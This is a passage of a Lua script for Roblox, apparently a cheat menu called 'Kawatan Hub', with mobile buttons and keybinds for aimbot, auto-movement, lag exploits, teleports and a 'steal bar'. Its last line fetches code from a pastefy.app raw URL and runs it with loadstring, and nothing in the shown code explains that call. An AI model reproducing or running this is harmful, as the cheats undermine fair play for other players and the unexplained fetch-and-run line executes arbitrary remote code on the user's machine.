        shapeValLbl.Size=UDim2.new(0,70,0,26); shapeValLbl.Position=UDim2.new(1,-110,0.5,-13)
        shapeValLbl.Text=buttonShape; shapeValLbl.TextColor3=C.text; shapeValLbl.TextSize=11
        shapeValLbl.Font=Enum.Font.GothamBold; shapeValLbl.BorderSizePixel=0; corner(shapeValLbl,7)
        local sLeft=Instance.new("TextButton",shapeRow); sLeft.Size=UDim2.new(0,26,0,26)
        sLeft.Position=UDim2.new(1,-140,0.5,-13); sLeft.BackgroundColor3=C.dark; sLeft.Text="<"
        sLeft.TextColor3=C.text; sLeft.TextSize=12; sLeft.Font=Enum.Font.GothamBold
        sLeft.AutoButtonColor=false; sLeft.BorderSizePixel=0; corner(sLeft,6)
        local sRight=Instance.new("TextButton",shapeRow); sRight.Size=UDim2.new(0,26,0,26)
        sRight.Position=UDim2.new(1,-34,0.5,-13); sRight.BackgroundColor3=C.dark; sRight.Text=">"
        sRight.TextColor3=C.text; sRight.TextSize=12; sRight.Font=Enum.Font.GothamBold
        sRight.AutoButtonColor=false; sRight.BorderSizePixel=0; corner(sRight,6)
        local function cycleShape(dir)
            shapeIdx=shapeIdx+dir; if shapeIdx<1 then shapeIdx=#shapes end
            if shapeIdx>#shapes then shapeIdx=1 end
            buttonShape=shapes[shapeIdx]; shapeValLbl.Text=buttonShape
            if rebuildMobileShape then rebuildMobileShape() end
            pcall(function() markConfigDirty() end)
        end
        sLeft.MouseButton1Click:Connect(function() cycleShape(-1) end, logoVisible)
        sRight.MouseButton1Click:Connect(function() cycleShape(1) end)
        togRow(p,"Show Mobile Buttons",8,nil,function(on) if setMobileVisible then setMobileVisible(on) end end,true)
        secLbl(p,"KEYBINDS",9)
        kbRow(p,"GUI Hide",Keys.guiHide,10,function(k) Keys.guiHide=k end)
    end,
}

local function showTab(name)
    currentTab=name
    for n,btn in pairs(tabBtns) do
        if n==name then
            btn.BackgroundColor3=C.accentDim; btn.BackgroundTransparency=0; btn.TextColor3=Color3.fromRGB(180, 230, 255)
            if not btn:FindFirstChildOfClass("UIStroke") then stroke(btn,C.accent,1,0.2) end
        else
            btn.BackgroundColor3=C.row; btn.BackgroundTransparency=0.4; btn.TextColor3=C.textDim
            local st=btn:FindFirstChildOfClass("UIStroke"); if st then st:Destroy() end
        end
    end
    for _,ch in ipairs(content:GetChildren()) do if not ch:IsA("UIListLayout") then ch:Destroy() end end
    if pageData[name] then pageData[name](content) end
end

for name,btn in pairs(tabBtns) do btn.MouseButton1Click:Connect(function() showTab(name) end) end
pcall(function() showTab("MOVEMENT") end)

-- drag main
do
    local drag,start,startPos
    main.InputBegan:Connect(function(input)
        if uiLocked then return end
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            drag=true; start=input.Position; startPos=main.Position
            input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then drag=false end end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if drag and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
            local d=input.Position-start; main.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
        end
    end)
end

local reopenBtn = Instance.new("TextButton")
reopenBtn.Name = "KawatanReopen"
reopenBtn.Size = UDim2.new(0, 200, 0, 44)
reopenBtn.Position = UDim2.new(0.5, -100, 0, 18)
reopenBtn.AnchorPoint = Vector2.new(0, 0)
reopenBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
reopenBtn.BackgroundTransparency = 0.08
reopenBtn.BorderSizePixel = 0
reopenBtn.Text = "KAWATAN"
reopenBtn.TextColor3 = Color3.fromRGB(0, 140, 255)
reopenBtn.Font = Enum.Font.GothamBlack
reopenBtn.TextSize = 22
reopenBtn.AutoButtonColor = false
reopenBtn.Visible = false
reopenBtn.ZIndex = 50
reopenBtn.Parent = gui
corner(reopenBtn, 22)
stroke(reopenBtn, Color3.fromRGB(30, 30, 35), 1.2, 0.35)

-- drag reopen pill
do
    local dragging, start, startPos
    reopenBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            start = input.Position
            startPos = reopenBtn.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = input.Position - start
        reopenBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end)
end

local function setMenuVisible(on)
    main.Visible = on
    reopenBtn.Visible = not on
end

reopenBtn.MouseButton1Click:Connect(function()
    setMenuVisible(true)
end)

minBtn.MouseButton1Click:Connect(function()
    setMenuVisible(false)
end)

-- keybind hide also shows reopen

-- â”€â”€â”€ MOBILE BUTTONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local mobileGui=Instance.new("ScreenGui")
mobileGui.Name="KawatanMobileVisual"; mobileGui.ResetOnSpawn=false; mobileGui.IgnoreGuiInset=true
mobileGui.DisplayOrder=60; mobileGui.Parent=PlayerGui

local mobileHolders={}
local mobileScales={}

local mobileLabels={
    {label="DROP",         col=0,row=0},
    {label="AUTO LEFT",    col=1,row=0},
    {label="AIMBOT",       col=0,row=1},
    {label="AUTO RIGHT",   col=1,row=1},
    {label="TP DOWN",      col=0,row=2},
    {label="CARRY SPEED",  col=1,row=2},
    {label="LAGGER CARRY", col=0,row=3},
    {label="LAGGER SPEED", col=1,row=3},
    {label="TP BAT",       col=0,row=4},
    {label="INSTA RESET",  col=1,row=4},
}

local mobileActions={
    ["DROP"]         = function() runDrop() end,
    ["AUTO LEFT"]    = function()
        autoLeftEnabled=not autoLeftEnabled
        if autoLeftEnabled then if autoRightEnabled then autoRightEnabled=false;stopAutoRight() end; startAutoLeft()
        else stopAutoLeft() end
        if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(autoLeftEnabled) end
    end,
    ["AIMBOT"]       = function()
        if autoBatEnabled then stopBatAimbot() else startBatAimbot() end
    end,
    ["AUTO RIGHT"]   = function()
        autoRightEnabled=not autoRightEnabled
        if autoRightEnabled then if autoLeftEnabled then autoLeftEnabled=false;stopAutoLeft() end; startAutoRight()
        else stopAutoRight() end
        if mobBtnRefs.autoRight then mobBtnRefs.autoRight(autoRightEnabled) end
    end,
    ["TP DOWN"]      = function() runTPFloor() end,
    ["CARRY SPEED"]  = function() carryActive=not carryActive;applySpeed() end,
    ["LAGGER CARRY"] = function() carryActive=true;laggerActive=true;applySpeed() end,
    ["LAGGER SPEED"] = function() laggerActive=not laggerActive;carryActive=false;applySpeed() end,
    ["TP BAT"]       = function()
        toggleTPBat()
    end,
    ["INSTA RESET"]  = function() doInstaReset() end,
}

local function getShapeRadius()
    return buttonShape=="CIRCLE" and 99 or 10
end

local function buildMobileHolder(entry)
    local w,h = 78,42
    local gapX,gapY = w+10, h+10
    local originX,originY = -20,-175

    local holder=Instance.new("Frame")
    holder.Name="MB_"..entry.label:gsub("%s","")
    holder.Size=UDim2.new(0,w,0,h)
    holder.Position=UDim2.new(1,originX-(1-entry.col)*gapX-w, 0.5, originY+entry.row*gapY)
    holder.BackgroundTransparency=1; holder.Parent=mobileGui

    local sc=Instance.new("UIScale"); sc.Name="MobileScale"; sc.Scale=mobileScaleValue; sc.Parent=holder
    table.insert(mobileScales,sc)

    local btn=Instance.new("TextButton")
    btn.Size=UDim2.new(1,0,1,0); btn.BackgroundColor3=Color3.fromRGB(10,10,10)
    btn.Text=entry.label; btn.TextColor3=Color3.fromRGB(215,215,215); btn.TextSize=11
    btn.Font=Enum.Font.GothamBold; btn.TextWrapped=true; btn.AutoButtonColor=false
    btn.BorderSizePixel=0; btn.Parent=holder
    corner(btn, getShapeRadius())
    stroke(btn, Color3.fromRGB(45,45,45), 1.2, 0.2)

    local on=false
    local function setActive(v)
        on = v
        tw(btn, {
            BackgroundColor3 = v and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(10, 10, 10),
            TextColor3 = v and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(215, 215, 215),
        }, 0.12)
        local st = btn:FindFirstChildOfClass("UIStroke")
        if st then
            tw(st, {Color = v and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(45, 45, 45)}, 0.12)
        end
    end

    local sticky = ({
        ["AIMBOT"]=true, ["AUTO LEFT"]=true, ["AUTO RIGHT"]=true,
        ["CARRY SPEED"]=true, ["LAGGER SPEED"]=true, ["LAGGER CARRY"]=true,
        ["TP BAT"]=true,
    })[entry.label] == true

    btn.MouseButton1Click:Connect(function()
        local action = mobileActions[entry.label]
        if action then action() end
        if sticky then
            -- re-read state after action
            local state = false
            if entry.label == "AIMBOT" then state = autoBatEnabled
            elseif entry.label == "AUTO LEFT" then state = autoLeftEnabled
            elseif entry.label == "AUTO RIGHT" then state = autoRightEnabled
            elseif entry.label == "CARRY SPEED" then state = carryActive and not laggerActive
            elseif entry.label == "LAGGER SPEED" then state = laggerActive and not carryActive
            elseif entry.label == "LAGGER CARRY" then state = laggerActive and carryActive
            elseif entry.label == "TP BAT" then state = tpBatEnabled
            end
            setActive(state)
        else
            -- momentary: flash blue then back
            setActive(true)
            task.delay(0.18, function() if btn and btn.Parent then setActive(false) end end)
        end
    end)

    -- mobile-button ref for visual sync
    if entry.label=="AIMBOT" then
        mobBtnRefs.aimbot=setActive
    elseif entry.label=="AUTO LEFT" then
        mobBtnRefs.autoLeft=setActive
    elseif entry.label=="AUTO RIGHT" then
        mobBtnRefs.autoRight=setActive
    elseif entry.label=="CARRY SPEED" then
        mobBtnRefs.carry=setActive
    elseif entry.label=="LAGGER SPEED" then
        mobBtnRefs.lagger=setActive
    elseif entry.label=="LAGGER CARRY" then
        mobBtnRefs.laggerCarry=setActive
    elseif entry.label=="TP BAT" then
        mobBtnRefs.tpBat=setActive
    end

    -- drag
    do
        local bdrag,pressPos,holderStart
        btn.InputBegan:Connect(function(input)
            if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
                bdrag=true; pressPos=input.Position; holderStart=holder.Position
                input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then bdrag=false end end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not bdrag then return end
            if input.UserInputType~=Enum.UserInputType.MouseMovement and input.UserInputType~=Enum.UserInputType.Touch then return end
            local d=input.Position-pressPos
            holder.Position=UDim2.new(holderStart.X.Scale,holderStart.X.Offset+d.X,holderStart.Y.Scale,holderStart.Y.Offset+d.Y)
        end)
    end

    return holder, btn
end

for _,entry in ipairs(mobileLabels) do
    buildMobileHolder(entry)
end

applyMobileScale=function()
    for _,sc in ipairs(mobileScales) do sc.Scale=mobileScaleValue end
end

rebuildMobileShape=function()
    local rad=getShapeRadius()
    for _,holder in ipairs(mobileGui:GetChildren()) do
        if holder:IsA("Frame") and holder.Name:sub(1,3)=="MB_" then
            local btn=holder:FindFirstChildOfClass("TextButton")
            if btn then
                local uc=btn:FindFirstChildOfClass("UICorner")
                if uc then uc.CornerRadius=UDim.new(0,rad) end
            end
        end
    end
end

setMobileVisible=function(on) mobileGui.Enabled=on end

-- â”€â”€â”€ STEAL BAR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local stealBar=Instance.new("Frame",gui)
stealBar.Size=UDim2.new(0,420,0,36); stealBar.Position=UDim2.new(0.5,-210,0,72)
stealBar.BackgroundColor3=Color3.fromRGB(10,12,16); stealBar.BackgroundTransparency=0.08
stealBar.BorderSizePixel=0; corner(stealBar,12); stroke(stealBar,Color3.fromRGB(35,40,52),1.2,0.25)

local track=Instance.new("Frame",stealBar); track.Size=UDim2.new(1,-20,0,4)
track.Position=UDim2.new(0,10,1,-8); track.BackgroundColor3=Color3.fromRGB(30,34,44); track.BorderSizePixel=0; corner(track,3)
Instance.new("Frame",track).BackgroundColor3=C.accent

local leftLbl=Instance.new("TextLabel",stealBar); leftLbl.BackgroundTransparency=1
leftLbl.Size=UDim2.new(0.28,0,1,-8); leftLbl.Position=UDim2.new(0,12,0,0)
leftLbl.TextColor3=C.textDim; leftLbl.TextSize=12; leftLbl.Font=Enum.Font.GothamSemibold
leftLbl.TextXAlignment=Enum.TextXAlignment.Left; leftLbl.Text="FPS: â€”"

local midLbl=Instance.new("TextLabel",stealBar); midLbl.BackgroundTransparency=1
midLbl.Size=UDim2.new(0.4,0,1,-8); midLbl.Position=UDim2.new(0.3,0,0,0)
midLbl.Text="KAWATAN HUB"; midLbl.TextColor3=C.white; midLbl.TextSize=12; midLbl.Font=Enum.Font.GothamBold
midLbl.TextXAlignment=Enum.TextXAlignment.Center

local rightLbl=Instance.new("TextLabel",stealBar); rightLbl.BackgroundTransparency=1
rightLbl.Size=UDim2.new(0.28,0,1,-8); rightLbl.Position=UDim2.new(0.7,-8,0,0)
rightLbl.TextColor3=C.textDim; rightLbl.TextSize=12; rightLbl.Font=Enum.Font.GothamSemibold
rightLbl.TextXAlignment=Enum.TextXAlignment.Right; rightLbl.Text="PING: â€”"

do
    local bdrag,start,startPos; stealBar.Active=true
    stealBar.InputBegan:Connect(function(input)
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            bdrag=true; start=input.Position; startPos=stealBar.Position
            input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then bdrag=false end end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if bdrag and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
            local d=input.Position-start
            stealBar.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
        end
    end)
end

-- live FPS + ping
local fpsCount=0
RunService.RenderStepped:Connect(function() fpsCount+=1 end)
task.spawn(function()
    while leftLbl and leftLbl.Parent do
        task.wait(1)
        leftLbl.Text=string.format("FPS: %d",fpsCount); fpsCount=0
        pcall(function()
            local ping=game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
            rightLbl.Text=string.format("PING: %dms",math.floor(ping))
        end)
    end
end)

-- â”€â”€â”€ KEYBINDS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
UIS.InputBegan:Connect(function(input,gpe)
    if gpe then return end
    local k=input.KeyCode
    if k==Keys.drop      then runDrop() end
    if k==Keys.tpFloor   then doInstaReset() end
    if k==Enum.KeyCode.X then runTPFloor() end
    if k==Keys.guiHide then setMenuVisible(not main.Visible) end
    if k==Keys.lagger     then laggerActive=not laggerActive;applySpeed() end
    if k==Keys.laggerCarry then carryActive=not carryActive;laggerActive=true;applySpeed() end
    if k==Enum.KeyCode.Q then carryActive=not carryActive;applySpeed() end
    if k==Keys.aimbot then
        if autoBatEnabled then stopBatAimbot() else startBatAimbot() end
    end
    if k==Keys.autoLeft then
        autoLeftEnabled=not autoLeftEnabled
        if autoLeftEnabled then if autoRightEnabled then autoRightEnabled=false;stopAutoRight() end;startAutoLeft()
        else stopAutoLeft() end
    end
    if k==Keys.autoRight then
        autoRightEnabled=not autoRightEnabled
        if autoRightEnabled then if autoLeftEnabled then autoLeftEnabled=false;stopAutoLeft() end;startAutoRight()
        else stopAutoRight() end
    end
end)

RunService.Heartbeat:Connect(function()
    if mobBtnRefs.aimbot then mobBtnRefs.aimbot(autoBatEnabled) end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(autoLeftEnabled) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(autoRightEnabled) end
    if mobBtnRefs.carry then mobBtnRefs.carry(carryActive and not laggerActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerActive and not carryActive) end
    if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(laggerActive and carryActive) end
    if mobBtnRefs.tpBat then mobBtnRefs.tpBat(tpBatEnabled) end
end)

pcall(loadConfig)
_configReady = true
pcall(function()
    if game and game.Close then
        game.Close:Connect(function() pcall(saveConfig) end)
    end
end)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()